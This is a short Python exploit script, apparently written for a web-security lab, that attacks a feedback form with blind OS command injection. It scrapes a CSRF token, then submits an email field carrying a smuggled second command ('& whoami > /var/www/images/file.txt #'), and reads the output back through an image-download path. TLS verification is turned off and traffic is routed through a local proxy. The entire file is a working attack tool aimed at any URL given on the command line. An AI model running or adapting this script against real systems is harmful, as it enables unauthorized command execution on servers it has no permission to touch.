import requests
import sys
import urllib3
from bs4 import BeautifulSoup


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

output_file = "file.txt"
proxies =  {
            "http" :"http://127.0.0.1:8080",
            "https":"http://127.0.0.1:8080"
            }

def get_csrf_token(session,url):
    feedback_form_path = "/feedback"
    response = session.get(url+feedback_form_path ,verify=False,proxies=proxies)
    soup = BeautifulSoup(response.text,"html.parser")
    csrf_token = soup.find("input")["value"]
    return csrf_token

def check_success(session , url):
    path_to_get_file ="/image?filename=" + output_file
    response = session.get(url+path_to_get_file, verify=False, proxies=proxies)
    if response.status_code == 200 :
        print("(+) The following is the content of the command ")
        print("------------------------------")
        print(response.text)
        print("------------------------------")

        return True
    else :
        return False

def exploit_command_injectio(session,url):
    feedback_path = "/feedback/submit"
    payload=  "ayhaga@gmail.com & whoami > /var/www/images/" + output_file + " #"
    csrf_token = get_csrf_token(session,url)
    params = {
        "csrf":csrf_token,
        "name": "test",
        "email":payload,
        "subject":"test",
        "message":"test"
    }

    response = session.post(url+feedback_path, data=params , verify = False , proxies = proxies)

    print("(+) Checking if the exploitation completed successfully")


    if check_success(session,url) :
        print("(+) Exploit Done successfully..")

    else:
        print("(-) Something went wrong!!")




def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url> " %sys.argv[0])
        print("(+) Example: %s www.example.com"  %sys.argv[0])
    
    url = sys.argv[1]
    print("(+) Exploiting blind command injection in email field..")
    session = requests.Session()
    exploit_command_injectio(session,url)



if __name__ == "__main__":
    main()